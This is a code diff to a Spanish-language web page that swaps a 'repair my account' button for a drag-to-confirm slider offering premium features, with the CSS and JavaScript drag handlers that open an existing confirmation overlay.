@@ -51,6 +51,10 @@
     .btn-outline {background:transparent;border:1px solid var(--primary);color:var(--primary);}
     .btn-outline:hover {background:rgba(26,31,113,0.05);transform:translateY(-3px);}
 
+    .slide-btn{position:relative;width:100%;height:3rem;background:var(--primary);color:#fff;border-radius:var(--radius-full);display:flex;align-items:center;justify-content:center;font-weight:600;user-select:none;overflow:hidden;box-shadow:var(--shadow-md);cursor:pointer;}
+    .slide-btn .slide-text{pointer-events:none;z-index:1;}
+    .slide-btn .slide-handle{position:absolute;top:0;left:0;width:3rem;height:100%;background:var(--accent);border-radius:var(--radius-full);display:flex;align-items:center;justify-content:center;color:var(--neutral-900);transition:left 0.2s ease;box-shadow:var(--shadow-sm);}
+
     .login-container {position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:1.5rem;background:var(--neutral-200);background-image:linear-gradient(135deg,rgba(26,31,113,0.05) 0%,rgba(26,31,113,0.02) 100%);overflow-y:auto;z-index:2000;}
     .login-card {background:var(--neutral-100);border-radius:var(--radius-lg);box-shadow:var(--shadow-lg);padding:1.5rem;width:100%;max-width:400px;overflow:visible;}
     .login-logo{display:flex;flex-direction:column;align-items:center;justify-content:center;margin-bottom:0;}
@@ -112,7 +116,10 @@
       <span class="led-light" id="led-light"></span>
       <span id="led-message"></span>
     </div>
-    <button class="btn btn-primary" id="repair-btn-main"><i class="fas fa-tools"></i> Reparar mi cuenta</button>
+    <div class="slide-btn" id="premium-slider">
+      <span class="slide-text">Desliza para habilitar funciones premium</span>
+      <span class="slide-handle"><i class="fas fa-angle-double-right"></i></span>
+    </div>
   </div>
 </div>
 <div class="modal-overlay" id="repair-confirm-overlay" style="display:none;">
@@ -250,16 +257,31 @@ function initLoginLedIndicator(){
 document.addEventListener('DOMContentLoaded',function(){
   displayPreLoginBalance();
   personalizeLogin();
-  const btn=document.getElementById('repair-btn-main');
   const confirmOverlay=document.getElementById('repair-confirm-overlay');
   const successOverlay=document.getElementById('repair-success-overlay');
-  document.getElementById('repair-cancel-btn').addEventListener('click',()=>{confirmOverlay.style.display='none';});
+  document.getElementById('repair-cancel-btn').addEventListener('click',()=>{confirmOverlay.style.display='none';resetSlider();});
   document.getElementById('repair-confirm-btn').addEventListener('click',()=>{confirmOverlay.style.display='none';successOverlay.style.display='flex';if(typeof confetti!=='undefined'){confetti({particleCount:150,spread:80,origin:{y:0.6}});}});
-  document.getElementById('repair-success-continue').addEventListener('click',()=>{successOverlay.style.display='none';if(typeof activateRepair==='function') activateRepair();});
-  btn.addEventListener('click',function(){
-    Swal.fire({title:'¿Ya realizaste tu primera recarga?',icon:'question',showCancelButton:true,confirmButtonText:'Sí',cancelButtonText:'No'}).then(res=>{if(res.isConfirmed){confirmOverlay.style.display='flex';}});
-  });
+  document.getElementById('repair-success-continue').addEventListener('click',()=>{successOverlay.style.display='none';if(typeof activateRepair==='function') activateRepair();resetSlider();});
+  setupSlideButton();
 });
+
+function setupSlideButton(){
+  const slider=document.getElementById('premium-slider');
+  if(!slider) return;
+  const handle=slider.querySelector('.slide-handle');
+  const confirmOverlay=document.getElementById('repair-confirm-overlay');
+  let dragging=false,startX=0;
+  const max=()=>slider.clientWidth-handle.clientWidth;
+  function move(e){if(!dragging) return;e.preventDefault();const clientX=e.touches?e.touches[0].clientX:e.clientX;const pos=Math.min(Math.max(0,clientX-startX),max());handle.style.left=pos+'px';}
+  function end(){if(!dragging) return;const pos=parseInt(handle.style.left||0,10);dragging=false;document.removeEventListener('mousemove',move);document.removeEventListener('touchmove',move);if(pos>=max()*0.9){handle.style.left=max()+'px';setTimeout(()=>{handle.style.left='0';},300);if(confirmOverlay) confirmOverlay.style.display='flex';}else{handle.style.left='0';}}
+  handle.addEventListener('mousedown',e=>{dragging=true;startX=(e.touches?e.touches[0].clientX:e.clientX)-handle.offsetLeft;document.addEventListener('mousemove',move);document.addEventListener('mouseup',end,{once:true});});
+  handle.addEventListener('touchstart',e=>{dragging=true;startX=e.touches[0].clientX-handle.offsetLeft;document.addEventListener('touchmove',move,{passive:false});document.addEventListener('touchend',end,{once:true});});
+}
+
+function resetSlider(){
+  const handle=document.querySelector('#premium-slider .slide-handle');
+  if(handle) handle.style.left='0';
+}
 </script>
 </body>
 </html>
